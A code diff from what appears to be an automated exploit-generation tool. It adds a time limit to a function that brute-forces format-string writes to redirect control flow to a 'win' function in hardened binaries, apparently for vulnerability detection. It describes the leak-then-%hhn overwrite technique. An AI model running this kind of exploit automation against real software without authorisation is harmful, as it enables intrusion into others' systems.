@@ -1668,7 +1668,7 @@ def canary_ret2win(exe, workdir, *, win_addr, **kw) -> dict:
 def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read_cap=255,
                    gate_prefix: bytes = b"", loop_exit: bytes = b"q\n", base_argv=(),
                    marker: bytes = b"LYKOS-FMT-9931", timeout: float = 10.0,
-                   mem_mb: int = 2048) -> dict:
+                   mem_mb: int = 2048, deadline=None) -> dict:
     """Format-string -> ret2win on a PIE + Full-RELRO target (GOT read-only, so a %n must hit a
     SAVED RETURN on the stack, not a GOT slot). Needs a LOOPING printf(user) sink: iteration 1 does a
     `%N$p` leak, iteration 2 does the `%hhn` write, then the function returns through the overwritten
@@ -1758,8 +1758,18 @@ def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read
     deep_lo = int(fmt_offset) + (read_cap // 8) + 1
 
     deltas = (8, 0, 16, -8, 24, -16, 32, 40)
+    # The (stack-ptr x delta) sweep is up to ~40x8 process spawns; unbounded it overruns the stage's
+    # time slice and -- worse -- when this runs in the crashless recover-phase build_exploit it STARVES
+    # the disassemble/detect that follow it, so a format-string target ends with NO function recovered
+    # and no CWE-134 finding at all. A wall-clock `deadline` (time.time() units, as the stage keeps it)
+    # bounds the sweep: it stops and reports honestly rather than eating the phase.
     for cand_idx in range(width):
+        if deadline and time.time() >= deadline:
+            return {"ok": False, "reason": "format-string ret2win: time slice reached before a "
+                    "(stack ptr, delta) redirected control (sweep bounded; raise --budget)"}
         for delta in deltas:
+            if deadline and time.time() >= deadline:
+                break
             p = _spawn()
             try:
                 _read_until(p, time.time() + 0.5)        # banner
